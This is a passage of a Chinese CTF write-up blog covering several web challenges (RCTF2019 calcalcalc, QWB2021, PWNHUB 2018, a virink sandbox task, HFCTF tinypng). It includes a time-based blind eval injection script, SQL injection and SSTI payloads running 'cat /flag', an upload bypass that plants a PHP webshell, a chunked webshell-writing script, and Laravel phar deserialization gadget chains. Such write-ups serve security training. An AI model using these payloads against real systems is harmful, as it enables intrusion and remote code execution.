+<p>参考：<a href=https://nikoeurus.github.io/2019/11/04/lfi2019/>wp1</a> | <a href=https://evoa.me/archives/13/>wp2</a></p>
+</details>
+<details>
+<summary>
+<h4 class=inline>
+*[RCTF2019]calcalcalc
+</h4>
+</summary>
+<p>给了源码，离谱，有3个语言的后端，pho nodejs python&mldr;&mldr;..</p>
+<p>先看前端，frontend/views/index.hbs</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120113421152.png alt=image-20220120113421152></p>
+<p>会post方式请求<code>/calculate</code>，但好像也算不了啥东西，返回201，然后是frontend/src/app.controller.ts</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120114124197.png alt=image-20220120114124197></p>
+<p>有一说一ts我看起来好费劲……它还涉及到另外两个文件，calculate.model.ts</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120114423330.png alt=image-20220120114423330></p>
+<p>其中用到的<code>@ExpressionValidator</code>，expresssion.validator.ts</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120114452545.png alt=image-20220120114452545></p>
+<p>如果18行的<code>isVip</code>为false，就会判断长度，我们可以直接传入json，设它为true</p>
+<p>三个后端都会对我们请求的式子进行运算，但只有三个返回结果一致时才可以通过</p>
+<p>Python的后端有处理post请求的部分，backend-python/src/app.py</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120113740173.png alt=image-20220120113740173></p>
+<p>会将请求的<code>expression</code>参数进行json处理后<code>eval</code>，那入手点就在这里了；但是13行的规则比较严苛，我们采用<code>chr()</code>的方式绕过</p>
+<p>但是由于它没有明确的回显，并且后端处于内网中不能外带数据，所以采用时间盲注的思想，配合二分的脚本拿flag</p>
+<p>*由于buuoj的内网环境问题，这里做不了，所以只写一下脚本，等啥时候修复了再回来做（脚本参考guoke师傅的，二分法</p>
+<p>核心的盲注payload是这个</p>
+<pre tabindex=0><code>__import__('time').sleep(5) if (ord(open('/flag','r').read() [str(i)])&gt;str(mid))else 1
+</code></pre><p>要过waf，所以转为<code>chr()</code>的形式，外面包一层<code>eval</code></p>
+<pre tabindex=0><code>import requests
+import time
+x=''
+def getpayload(num,mid):
+    payload=&quot;__import__('time').sleep(5) if (ord(open('/flag','r').read()[&quot;+str(num)+&quot;])&gt;&quot;+str(mid)+&quot;) else 1&quot;
+    data=''
+    for i in payload:
+        data+='chr('+str(ord(i))+')+'
+    return('eval('+data[:-1]+')')
+url='xxxx/calculate'
+for a in range(0,60):
+    max = 130
+    min = 30
+    while max &gt;=min:
+        mid=(max+min)//2
+        payload=getpayload(a,mid)
+        time1=time.time()
+        r = requests.post(url, json={'isVip': True, 'expression': payload})
+        time2=time.time()
+        if (time2-time1&gt;5):
+            min=mid+1
+        else:
+            max=mid
+        if max==mid==min:
+            x+=chr(mid)
+            print(str(a)+':'+x)
+            break
+</code></pre><p>参考：<a href=https://skysec.top/2019/05/18/2019-RCTF-Web-Writeup/#%E6%94%BB%E5%87%BB%E6%80%9D%E8%80%83>wp</a> | <a href=https://guokeya.github.io/post/xUUCnsZ57/>wp2</a></p>
+</details>
+<details>
+<summary>
+<h4 class=inline>
+[QWB2021 Quals]托纳多
+</h4>
+</summary>
+<p>注册账号登入，但是只有admin才有flag，那肯定得要sqli了，在登录的地方注了半天，结果发现注入点在注册的页面（尴尬），直接单引号就可以闭合</p>
+<pre tabindex=0><code>admin'or '1		# 回显this username had been used
+</code></pre><p>参考官方wp，这里用的是<code>processlist</code>表，这个表很特别</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220120160515099.png alt=image-20220120160515099></p>
+<p>它读取正在执行的sql语句，我们可以通过info列来获得当前的表名列名，还是用祖传的二分法来爆admin的密码</p>
+<p>（尴尬的是爆一会儿就寄了，害，寄寄寄</p>
+<p>按照预期解，登入后可以任意文件读取，读<code>/proc/self/cmdline</code>可以看到<code>python3 /qwb/app/app.py</code>，无法直接读app.py，但是可以读pyc</p>
+<p>http的响应头中有tornado的版本号6.0.3，对应的python>=3.5，爆破一下pyc的名称，得到pyc</p>
+<pre tabindex=0><code>/qwbimage.php?qwb_image_name=/qwb/app/__pycache__/app.cpython-35.pyc
+</code></pre><p>uncompyle6反编译得到源码</p>
+<pre tabindex=0><code>import tornado.ioloop, tornado.web, tornado.options, pymysql, os, re
+settings = {'static_path': os.path.join(os.getcwd(), 'static'),
+ 'cookie_secret': 'b93a9960-bfc0-11eb-b600-002b677144e0'}
+db_username = 'root'
+db_password = 'xxxx'
+class MainHandler(tornado.web.RequestHandler):
+
+    def get(self):
+        user = self.get_secure_cookie('user')
+        if user and user == b'admin':
+            self.redirect('/admin.php', permanent=True)
+            return
+        self.render('index.html')
+        
+class LoginHandler(tornado.web.RequestHandler):
+
+    def get(self):
+        username = self.get_argument('username', '')
+        password = self.get_argument('password', '')
+        if not username or not password:
+            if not self.get_secure_cookie('user'):
+                self.finish('&lt;script&gt;alert(`please input your password and username`);history.go(-1);&lt;/script&gt;')
+                return
+            if self.get_secure_cookie('user') == b'admin':
+                self.redirect('/admin.php', permanent=True)
+            else:
+                self.redirect('/', permanent=True)
+        else:
+            conn = pymysql.connect('localhost', db_username, db_password, 'qwb')
+            cursor = conn.cursor()
+            cursor.execute('SELECT * from qwbtttaaab111e where qwbqwbqwbuser=%s and qwbqwbqwbpass=%s', [username, password])
+            results = cursor.fetchall()
+            if len(results) != 0:
+                if results[0][1] == 'admin':
+                    self.set_secure_cookie('user', 'admin')
+                    cursor.close()
+                    conn.commit()
+                    conn.close()
+                    self.redirect('/admin.php', permanent=True)
+                    return
+                else:
+                    cursor.close()
+                    conn.commit()
+                    conn.close()
+                    self.finish('&lt;script&gt;alert(`login success, but only admin can get flag`);history.go(-1);&lt;/script&gt;')
+                    return
+            else:
+                cursor.close()
+                conn.commit()
+                conn.close()
+                self.finish('&lt;script&gt;alert(`your username or password is error`);history.go(-1);&lt;/script&gt;')
+                return
+            
+class RegisterHandler(tornado.web.RequestHandler):
+
+    def get(self):
+        username = self.get_argument('username', '')
+        password = self.get_argument('password', '')
+        word_bans = ['table', 'col', 'sys', 'union', 'inno', 'like', 'regexp']
+        bans = ['&quot;', '#', '%', '&amp;', ';', '&lt;', '=', '&gt;', '\\', '^', '`', '|', '*', '--', '+']
+        for ban in word_bans:
+            if re.search(ban, username, re.IGNORECASE):
+                self.finish('&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;')
+                return
+
+        for ban in bans:
+            if ban in username:
+                self.finish('&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;')
+                return
+        if not username or not password:
+            self.render('register.html')
+            return
+        if username == 'admin':
+            self.render('register.html')
+            return
+        conn = pymysql.connect('localhost', db_username, db_password, 'qwb')
+        cursor = conn.cursor()
+        try:
+            cursor.execute(&quot;SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where qwbqwbqwbuser='%s'&quot; % username)
+            results = cursor.fetchall()
+            if len(results) != 0:
+                self.finish('&lt;script&gt;alert(`this username had been used`);history.go(-1);&lt;/script&gt;')
+                conn.commit()
+                conn.close()
+                return
+        except:
+            conn.commit()
+            conn.close()
+            self.finish('&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;')
+            return
+        try:
+            cursor.execute('insert into qwbtttaaab111e (qwbqwbqwbuser, qwbqwbqwbpass) values(%s, %s)', [username, password])
+            conn.commit()
+            conn.close()
+            self.finish(&quot;&lt;script&gt;alert(`success`);location.href='/index.php';&lt;/script&gt;&quot;)
+            return
+        except:
+            conn.rollback()
+            conn.close()
+            self.finish('&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;')
+            return
+            
+class LogoutHandler(tornado.web.RequestHandler):
+
+    def get(self):
+        self.clear_all_cookies()
+        self.redirect('/', permanent=True)
+        
+class AdminHandler(tornado.web.RequestHandler):
+
+    def get(self):
+        user = self.get_secure_cookie('user')
+        if not user or user != b'admin':
+            self.redirect('/index.php', permanent=True)
+            return
+        self.render('admin.html')
+
+class ImageHandler(tornado.web.RequestHandler):
+
+    def get(self):
+        user = self.get_secure_cookie('user')
+        image_name = self.get_argument('qwb_image_name', 'header.jpeg')
+        if not image_name:
+            self.redirect('/', permanent=True)
+            return
+        else:
+            if not user or user != b'admin':
+                self.redirect('/', permanent=True)
+                return
+            if image_name.endswith('.py') or 'flag' in image_name or '..' in image_name:
+                self.finish(&quot;nonono, you can't read it.&quot;)
+                return
+            image_name = os.path.join(os.getcwd() + '/image', image_name)
+            with open(image_name, 'rb') as (f):
+                img = f.read()
+            self.set_header('Content-Type', 'image/jpeg')
+            self.finish(img)
+            return
+        
+class SecretHandler(tornado.web.RequestHandler):
+    def get(self):
+        if len(tornado.web.RequestHandler._template_loaders):
+            for i in tornado.web.RequestHandler._template_loaders:
+                tornado.web.RequestHandler._template_loaders[i].reset()
+
+        msg = self.get_argument('congratulations', 'oh! you find it')
+        bans = []
+        for ban in bans:
+            if ban in msg:
+                self.finish('bad hack,go out!')
+                return
+
+        with open('congratulations.html', 'w') as (f):
+            f.write('&lt;html&gt;&lt;head&gt;&lt;title&gt;congratulations&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;%s&quot;);location.href=\'/admin.php\';&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n' % msg)
+            f.flush()
+        self.render('congratulations.html')
+        if tornado.web.RequestHandler._template_loaders:
+            for i in tornado.web.RequestHandler._template_loaders:
+                tornado.web.RequestHandler._template_loaders[i].reset()
+                
+def make_app():
+    return tornado.web.Application([
+     (
+      '/index.php', MainHandler),
+     (
+      '/login.php', LoginHandler),
+     (
+      '/logout.php', LogoutHandler),
+     (
+      '/register.php', RegisterHandler),
+     (
+      '/admin.php', AdminHandler),
+     (
+      '/qwbimage.php', ImageHandler),
+     (
+      '/good_job_my_ctfer.php', SecretHandler),
+     (
+      '/', MainHandler)], **settings)
+
+
+if __name__ == '__main__':
+    app = make_app()
+    app.listen(8000)
+    tornado.ioloop.IOLoop.current().start()
+    print('start')
+</code></pre><p>可以看到<code>/good_job_my_ctfer.php</code>有ssti，但是<code>{{}}</code>被过滤，只能用<code>{%%}</code>，这里用到的是<code>{%extends %}</code>，它可以传递一个文件路径作为参数，将其包含并渲染</p>
+<p>所以我们可以先通过sqli的outfile写文件，然后通过ssti包含 来执行读flag的命令</p>
+<pre tabindex=0><code>/register.php?username=amiz&amp;password={%set return __import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()%}
+/register.php?username=amiz' into outfile '/var/lib/mysql-files/amiz&amp;password=amiz
+/good_job_my_ctfer.php?congratulations={%extends /var/lib/mysql-files/amiz%}
+</code></pre><p>先通过注册把payload写到密码部分，然后outfile到mysql的默认导出目录<code>/var/lib/mysql-files/</code>，最后包含</p>
+<p>flag{79d863ac-1fc6-42f6-951a-d3b6f0468b7f}</p>
+</details>
+<details>
+<summary>
+<h4 class=inline>
+[PWNHUB 公开赛 2018]傻 fufu 的工作日
+</h4>
+</summary>
+<p>/UploadFile.class.php.bak, /index.php.bak 有备份文件泄露，使用phpjiami进行加密，我们用脚本进行解密</p>
+<pre tabindex=0><code>&lt;?php
+if($_FILES) {
+    include 'UploadFile.class.php';
+    $dist = 'upload';
+    $upload = new UploadFile($dist, 'upfile');
+    $data = $upload-&gt;upload();
+}
+</code></pre><pre tabindex=0><code>&lt;?php
+
+class UploadFile {
+    public $error = '';
+
+    protected $field;
+    protected $allow_ext;
+    protected $allow_size;
+    protected $dist_path;
+    protected $new_path;
+
+    function __construct($dist_path, $field='upfile', $new_name='random', $allow_ext=['gif', 'jpg', 'jpeg', 'png'], $allow_size=102400)
+    {
+        $this-&gt;field = $field;
+        $this-&gt;allow_ext = $allow_ext;
+        $this-&gt;allow_size = $allow_size;
+        $this-&gt;dist_path = realpath($dist_path);
+
+        if ($new_name === 'random') {
+            $this-&gt;new_name = uniqid();
+        } elseif (is_string($new_name)) {
+            $this-&gt;new_name = $new_name;
+        } else {
+            $this-&gt;new_name = null;
+        }
+    }
+
+    protected function codeToMessage($code) 
+    { 
+        switch ($code) {
+            case UPLOAD_ERR_INI_SIZE: 
+                $message = &quot;The uploaded file exceeds the upload_max_filesize directive in php.ini&quot;; 
+                break; 
+            case UPLOAD_ERR_FORM_SIZE: 
+                $message = &quot;The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form&quot;;
+                break; 
+            case UPLOAD_ERR_PARTIAL: 
+                $message = &quot;The uploaded file was only partially uploaded&quot;; 
+                break; 
+            case UPLOAD_ERR_NO_FILE: 
+                $message = &quot;No file was uploaded&quot;; 
+                break; 
+            case UPLOAD_ERR_NO_TMP_DIR: 
+                $message = &quot;Missing a temporary folder&quot;; 
+                break; 
+            case UPLOAD_ERR_CANT_WRITE: 
+                $message = &quot;Failed to write file to disk&quot;; 
+                break; 
+            case UPLOAD_ERR_EXTENSION: 
+                $message = &quot;File upload stopped by extension&quot;; 
+                break; 
+            default: 
+                $message = &quot;Unknown upload error&quot;; 
+                break; 
+        } 
+        return $message; 
+    } 
+
+    protected function error($info)
+    {
+        $this-&gt;error = $info;
+        return false;
+    }
+
+    public function upload()
+    {
+        if(empty($_FILES[$this-&gt;field])) {
+            return $this-&gt;error('上传文件为空');
+        }
+        if(is_array($_FILES[$this-&gt;field]['error'])) {
+            return $this-&gt;error('一次只能上传一个文件');
+        }
+        if($_FILES[$this-&gt;field]['error'] != UPLOAD_ERR_OK) {
+            return $this-&gt;error($this-&gt;codeToMessage($_FILES[$this-&gt;field]['error']));
+        }
+        $filename = !empty($_POST[$this-&gt;field]) ? $_POST[$this-&gt;field] : $_FILES[$this-&gt;field]['name'];
+        if(!is_array($filename)) {
+            $filename = explode('.', $filename);
+        }
+        foreach ($filename as $name) {
+            if(preg_match('#[&lt;&gt;:&quot;/\\|?*.]#is', $name)) {
+                return $this-&gt;error('文件名中包含非法字符');
+            }
+        }
+
+        if($_FILES[$this-&gt;field]['size'] &gt; $this-&gt;allow_size) {
+            return $this-&gt;error('你上传的文件太大');
+        }
+        if(!in_array($filename[count($filename)-1], $this-&gt;allow_ext)) {
+            return $this-&gt;error('只允许上传图片文件');
+        }
+
+        // 用.分割文件名，只保留首尾两个字符串，防御Apache解析漏洞
+        $origin_name = current($filename);
+        $ext = end($filename);
+        $new_name = ($this-&gt;new_name ? $this-&gt;new_name : $origin_name) . '.' . $ext;
+        $target_fullpath = $this-&gt;dist_path . DIRECTORY_SEPARATOR . $new_name;
+
+        // 创建目录
+        if(!is_dir($this-&gt;dist_path)) {
+            mkdir($this-&gt;dist_path);
+        }
+
+        if(is_uploaded_file($_FILES[$this-&gt;field]['tmp_name']) &amp;&amp; move_uploaded_file($_FILES[$this-&gt;field]['tmp_name'], $target_fullpath)) {
+            // Success upload
+        } elseif (rename($_FILES[$this-&gt;field]['tmp_name'], $target_fullpath)) {
+            // Success upload
+        } else {
+            return $this-&gt;error('写入文件失败，可能是目标目录不可写');
+        }
+
+        return [
+            'name' =&gt; $origin_name,
+            'filename' =&gt; $new_name,
+            'type' =&gt; $ext
+        ];
+    }
+}
+ 
+</code></pre><p>注意到这个后缀</p>
+<pre tabindex=0><code>$filename = !empty($_POST[$this-&gt;field]) ? $_POST[$this-&gt;field] : $_FILES[$this-&gt;field]['name'];
+if(!in_array($filename[count($filename)-1], $this-&gt;allow_ext)) {
+    return $this-&gt;error('只允许上传图片文件');
+}
+$ext = end($filename);
+$target_fullpath = $this-&gt;dist_path . DIRECTORY_SEPARATOR . $new_name;
+</code></pre><p>在判断的时候用的是<code>count($filename)-1</code>，变相提示我们可以有很多的<code>name</code>，配合数组进行绕过</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220122191921885.png alt=image-20220122191921885></p>
+<pre tabindex=0><code>/upload/61ebe7df95da2.php?amiz=system('cat /flag_9bc85242c9f1a7663e6806778e8a8558');
+</code></pre><p>flag_9bc85242c9f1a7663e6806778e8a8558</p>
+</details>
+<details>
+<summary>
+<h4 class=inline>
+*ctf473831530_2018_web_virink_web
+</h4>
+</summary>
+<pre tabindex=0><code>&lt;?php
+    $sandbox = '/www/sandbox/' . md5('orange' . $_SERVER['REMOTE_ADDR']);
+    mkdir($sandbox);
+    chdir($sandbox);
+    if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 20) {
+        exec($_GET['cmd']);
+    } else if (isset($_GET['reset'])) {
+        exec('/bin/rm -rf ' . $sandbox);
+    }
+    echo &quot;&lt;br /&gt; IP : {\$_SERVER['REMOTE_ADDR']}&quot;;
+?&gt;
+</code></pre><p>跟orange佬的<a href=https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge>[HitconCTF 2017]babyfirst-revenge</a>一样，对cmd字符数更宽松了，这里采用师傅的脚本</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> <span style=color:#111>requests</span>
+
+<span style=color:#111>base_url</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;http://a40430ad-39b5-4020-a550-14afee81e640.node1.buuoj.cn&#39;</span>
+
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>exec_cmd2</span><span style=color:#111>(</span><span style=color:#111>c</span><span style=color:#111>):</span>
+    <span style=color:#75715e># exec cmd</span>
+    <span style=color:#111>my_params</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span>
+        <span style=color:#d88200>&#39;cmd&#39;</span><span style=color:#111>:</span> <span style=color:#111>c</span>
+    <span style=color:#111>}</span>
+    <span style=color:#111>r</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#111>base_url</span><span style=color:#111>,</span> <span style=color:#111>params</span><span style=color:#f92672>=</span><span style=color:#111>my_params</span><span style=color:#111>)</span>
+    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#39;exec cmd2&#39;</span><span style=color:#111>,</span> <span style=color:#111>c</span><span style=color:#111>,</span> <span style=color:#111>r</span><span style=color:#111>)</span>
+
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>write_webshell</span><span style=color:#111>():</span>
+    <span style=color:#111>filename</span> <span style=color:#f92672>=</span> <span style=color:#111>[</span><span style=color:#d88200>r</span><span style=color:#d88200>&#39;&gt;echo\ </span><span style=color:#8045ff>\\</span><span style=color:#d88200>&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>r</span><span style=color:#d88200>&#34;&gt;\&#39;\&lt;\?php </span><span style=color:#8045ff>\\</span><span style=color:#d88200>&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>r</span><span style=color:#d88200>&#39;&gt;eval\(&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>r</span><span style=color:#d88200>&#39;&gt;\$_GET\[c\]\)&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>r</span><span style=color:#d88200>&#34;&gt;\;\&#39;\&gt;2.php&#34;</span><span style=color:#111>]</span>
+    <span style=color:#00a8c8>for</span> <span style=color:#111>i</span> <span style=color:#f92672>in</span> <span style=color:#111>filename</span><span style=color:#111>:</span>
+        <span style=color:#111>my_params</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span>
+            <span style=color:#d88200>&#39;cmd&#39;</span><span style=color:#111>:</span> <span style=color:#111>i</span>
+        <span style=color:#111>}</span>
+        <span style=color:#111>r</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#111>base_url</span><span style=color:#111>,</span> <span style=color:#111>params</span><span style=color:#f92672>=</span><span style=color:#111>my_params</span><span style=color:#111>)</span>
+        <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>i</span><span style=color:#111>,</span> <span style=color:#111>r</span><span style=color:#f92672>.</span><span style=color:#111>status_code</span><span style=color:#111>)</span>
+
+    <span style=color:#111>cmd_list</span> <span style=color:#f92672>=</span> <span style=color:#111>[</span><span style=color:#d88200>&#39;ls -tr&gt;1.sh&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;sh 1.sh&#39;</span><span style=color:#111>]</span>
+    <span style=color:#00a8c8>for</span> <span style=color:#111>i</span> <span style=color:#f92672>in</span> <span style=color:#111>cmd_list</span><span style=color:#111>:</span>
+        <span style=color:#111>exec_cmd2</span><span style=color:#111>(</span><span style=color:#111>i</span><span style=color:#111>)</span>
+
+<span style=color:#00a8c8>if</span> <span style=color:#111>__name__</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;__main__&#39;</span><span style=color:#111>:</span>
+    <span style=color:#111>write_webshell</span><span style=color:#111>()</span>
+    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#39;ok&#39;</span><span style=color:#111>)</span>
+
+</code></pre></div><p>之后用/sandbox/xxxx/2.php?c=eval($_POST[&lsquo;cmd&rsquo;]);连接蚁剑，不过由于环境问题，后面内网的部分做不了了，寄</p>
+<p>参考：<a href=https://tiaonmmn.github.io/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/>wp</a></p>
+</details>
+<h2 id=page-08>page 08</h2>
+<details>
+<summary>
+<h4 class=inline>
+[HFCTF 2021 Final]tinypng
+</h4>
+</summary>
+<p>是laravel框架，给了很详细的源码，但是主要的也就是这些</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210802232459194.png alt=image-20210802232459194></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210802233146758.png alt=image-20210802233146758></p>
+<p>给出的laravel框架的源码，版本是8.53.0，首先从/routes/web.php入手看一下路由</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804005426972.png alt=image-20210804005426972></p>
+<p>一共两个路由，<code>/</code>即<code>/index</code>，实现的是文件上传的一些处理 比如后缀的过滤和文件名的设置之类的，<code>/image</code>则是特殊的，跟过去看ImageController类</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804005822800.png alt=image-20210804005822800></p>
+<p>亮点在第25行，新建了一个imgcompress实例并执行compressImg()，跟过去看</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804010352158.png alt=image-20210804010352158></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804010520380.png alt=image-20210804010520380></p>
+<p>首先调用的<code>_openImage()</code>里第44行的<code>getimagesize()</code>结合phar会触发反序列化，此处的参数$this->src来自于<code>$source</code>，也就是<code>$request -> input('image');</code>，也就是我们传入的image参数，可控</p>
+<p>反序列化的入口找到了，接下来就是找一找调用链，这里就直接放出来（我太菜了 寄</p>
+<p>可用链子1</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
+<span style=color:#00a8c8>namespace</span> <span style=color:#75af00>Symfony\Component\Routing\Loader\Configurator</span><span style=color:#111>{</span>
+    <span style=color:#00a8c8>class</span> <span style=color:#75af00>ImportConfigurator</span><span style=color:#111>{</span>
+        <span style=color:#00a8c8>private</span> <span style=color:#111>$parent</span><span style=color:#111>;</span>
+        <span style=color:#00a8c8>private</span> <span style=color:#111>$route</span><span style=color:#111>;</span>
+        <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>function</span> <span style=color:#111>__construct</span><span style=color:#111>(</span><span style=color:#111>$class</span><span style=color:#111>){</span>
+            <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>parent</span><span style=color:#f92672>=</span><span style=color:#111>$class</span><span style=color:#111>;</span>
+            <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>route</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;test&#39;</span><span style=color:#111>;</span>
+        <span style=color:#111>}</span>
+    <span style=color:#111>}</span>
+<span style=color:#111>}</span>
+ 
+<span style=color:#00a8c8>namespace</span> <span style=color:#75af00>Mockery</span><span style=color:#111>{</span>
+    <span style=color:#00a8c8>class</span> <span style=color:#75af00>HigherOrderMessage</span><span style=color:#111>{</span>
+        <span style=color:#00a8c8>private</span> <span style=color:#111>$mock</span><span style=color:#111>;</span>
+        <span style=color:#00a8c8>private</span> <span style=color:#111>$method</span><span style=color:#111>;</span>
+        <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>function</span> <span style=color:#111>__construct</span><span style=color:#111>(</span><span style=color:#111>$class</span><span style=color:#111>){</span>
+            <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>mock</span><span style=color:#f92672>=</span><span style=color:#111>$class</span><span style=color:#111>;</span>
+            <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>method</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;generate&#39;</span><span style=color:#111>;</span>
+        <span style=color:#111>}</span>
+    <span style=color:#111>}</span>
+<span style=color:#111>}</span>
+ 
+<span style=color:#00a8c8>namespace</span> <span style=color:#75af00>PHPUnit\Framework\MockObject</span><span style=color:#111>{</span>
+    <span style=color:#00a8c8>final</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>MockTrait</span><span style=color:#111>{</span>
+        <span style=color:#00a8c8>private</span> <span style=color:#111>$mockName</span><span style=color:#111>;</span>
+        <span style=color:#00a8c8>private</span> <span style=color:#111>$classCode</span><span style=color:#111>;</span>
+        <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>function</span> <span style=color:#111>__construct</span><span style=color:#111>(){</span>
+            <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>mockName</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;123&#39;</span><span style=color:#111>;</span>
+            <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>classCode</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;phpinfo();&#39;</span><span style=color:#111>;</span>
+        <span style=color:#111>}</span>
+    <span style=color:#111>}</span>
+<span style=color:#111>}</span>
+ 
+<span style=color:#00a8c8>namespace</span><span style=color:#111>{</span>
+    <span style=color:#00a8c8>use</span> <span style=color:#75af00>\Symfony\Component\Routing\Loader\Configurator\ImportConfigurator</span><span style=color:#111>;</span>
+    <span style=color:#00a8c8>use</span> <span style=color:#75af00>\Mockery\HigherOrderMessage</span><span style=color:#111>;</span>
+    <span style=color:#00a8c8>use</span> <span style=color:#75af00>\PHPUnit\Framework\MockObject\MockTrait</span><span style=color:#111>;</span>
+    <span style=color:#111>$c</span><span style=color:#f92672>=</span><span style=color:#00a8c8>new</span> <span style=color:#75af00>MockTrait</span><span style=color:#111>();</span>
+    <span style=color:#111>$b</span><span style=color:#f92672>=</span><span style=color:#00a8c8>new</span> <span style=color:#75af00>HigherOrderMessage</span><span style=color:#111>(</span><span style=color:#111>$c</span><span style=color:#111>);</span>
+    <span style=color:#111>$a</span><span style=color:#f92672>=</span><span style=color:#00a8c8>new</span> <span style=color:#75af00>ImportConfigurator</span><span style=color:#111>(</span><span style=color:#111>$b</span><span style=color:#111>);</span>
+    <span style=color:#f92672>@</span><span style=color:#75af00>unlink</span><span style=color:#111>(</span><span style=color:#d88200>&#34;phar.phar&#34;</span><span style=color:#111>);</span>
+    <span style=color:#111>$phar</span><span style=color:#f92672>=</span><span style=color:#00a8c8>new</span> <span style=color:#75af00>Phar</span><span style=color:#111>(</span><span style=color:#d88200>&#34;phar.phar&#34;</span><span style=color:#111>);</span>
+    <span style=color:#111>$phar</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>startBuffering</span><span style=color:#111>();</span> 
+    <span style=color:#111>$phar</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>setStub</span><span style=color:#111>(</span><span style=color:#d88200>&#39;GIF89a&#39;</span><span style=color:#f92672>.</span><span style=color:#d88200>&#34;__HALT_COMPILER();&#34;</span><span style=color:#111>);</span> 
+    <span style=color:#111>$phar</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>setMetadata</span><span style=color:#111>(</span><span style=color:#111>$a</span><span style=color:#111>);</span> 
+    <span style=color:#111>$phar</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>addFromString</span><span style=color:#111>(</span><span style=color:#d88200>&#34;test.txt&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;test&#34;</span><span style=color:#111>);</span>
+    <span style=color:#111>$phar</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>stopBuffering</span><span style=color:#111>();</span>
+<span style=color:#111>}</span>
+ 
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>可用链子2</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
+<span style=color:#00a8c8>namespace</span> <span style=color:#75af00>Illuminate\Broadcasting</span> <span style=color:#111>{</span>
